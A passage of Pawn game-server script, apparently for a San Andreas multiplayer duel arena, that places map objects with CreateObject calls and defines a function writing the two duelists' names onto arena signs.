	tmpobjid = CreateObject(18980,-2886.100,1773.159,6.057,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(18980,-2922.304,1725.525,6.137,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(18980,-2932.304,1725.525,6.137,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(18980,-2922.804,1810.525,6.137,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(18980,-2932.804,1810.525,6.137,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(1723,-2922.851,1809.339,18.723,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(1723,-2929.051,1809.339,18.723,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(1723,-2934.851,1809.339,18.723,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(1775,-2918.581,1812.546,19.723,0.000,0.000,270.000,300.0000);
	tmpobjid = CreateObject(1723,-2922.851,1811.439,18.723,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(1723,-2929.051,1811.439,18.723,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(1723,-2934.851,1811.439,18.723,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(1723,-2932.381,1726.046,18.723,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(1723,-2926.181,1726.046,18.723,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(1723,-2920.381,1726.046,18.723,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(1775,-2936.651,1722.839,19.723,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(1723,-2932.381,1723.946,18.723,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(1723,-2926.181,1723.946,18.723,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(1723,-2920.381,1723.946,18.723,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(1723,-2968.404,1772.996,18.723,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(1723,-2968.404,1766.896,18.723,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(1723,-2968.404,1760.996,18.723,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(1723,-2970.904,1772.996,18.723,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(1723,-2970.904,1766.896,18.723,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(1723,-2970.904,1760.996,18.723,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(955,-2971.947,1758.860,19.123,0.000,0.000,180.000,300.0000);
	tmpobjid = CreateObject(1723,-2886.747,1762.860,18.723,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(1723,-2886.747,1768.961,18.723,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(1723,-2886.747,1774.861,18.723,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(1723,-2884.247,1762.860,18.723,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(1723,-2884.247,1768.961,18.723,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(1723,-2884.247,1774.861,18.723,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(955,-2883.203,1776.996,19.123,0.000,0.000,0.000,300.0000);

	//////////  Duelists names /////////
	g_oSignText[0] = CreateObject(7301,-2928.018,1762.422,29.537,0.000,0.000,135.000,300.0000);
	g_oSignText[1] = CreateObject(7301,-2920.318,1770.202,29.537,0.000,0.000,225.000,300.0000);
	g_oSignText[2] = CreateObject(7301,-2935.819,1770.102,29.537,0.000,0.000,405.000,300.0000);
	g_oSignText[3] = CreateObject(7301,-2928.138,1777.882,29.537,0.000,0.000,315.000,300.0000);
}

SetDuelSignText(playerid, duelerid)
{
	// create our string to tell who is fighting vs who.
	new string[64];
	// format it so it's not empty
	format(string, sizeof(string), "%s vs %s", Player[playerid][Name], Player[duelerid][Name]);

	// Set all the object text to our new formatted string.
	for(new i = 0; i < sizeof(g_oSignText); i ++)
	{
		SetObjectMaterialText(g_oSignText[i], string, 0, 110, "Ariel", 30, 1, -16711936, -10066330, 1);
	}
}
